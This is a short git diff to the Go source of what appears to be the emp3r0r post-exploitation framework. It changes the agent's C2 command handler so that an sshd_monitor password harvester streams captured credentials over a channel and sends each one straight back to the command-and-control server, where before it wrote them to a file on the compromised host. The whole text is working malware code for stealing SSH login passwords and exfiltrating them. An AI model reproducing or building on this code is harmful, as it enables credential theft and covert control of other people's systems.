@@ -11,11 +11,10 @@ import (
 	"strconv"
 
 	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/pflag"
 )
 
-func platformC2CommandsHandler(cmdSlice []string) (out string) {
+func platformC2CommandsHandler(cmdSlice []string, cmd_id string) (out string) {
 	var err error
 
 	// parse command-line arguments using pflag
@@ -49,10 +48,14 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 			return
 		}
 
-		passfile := fmt.Sprintf("%s/%s.txt",
-			RuntimeConfig.AgentRoot, util.RandStr(10))
-		out = fmt.Sprintf("Look for passwords in %s", passfile)
-		go sshd_monitor(passfile, code_pattern_bytes)
+		harvester_log_stream := make(chan string, 4096)
+		go sshd_monitor(harvester_log_stream, code_pattern_bytes)
+		go func() {
+			for {
+				out = <-harvester_log_stream
+				sendResponse(out, cmd_id, cmdSlice)
+			}
+		}()
 		return
 
 	// !inject --method method --pid pid
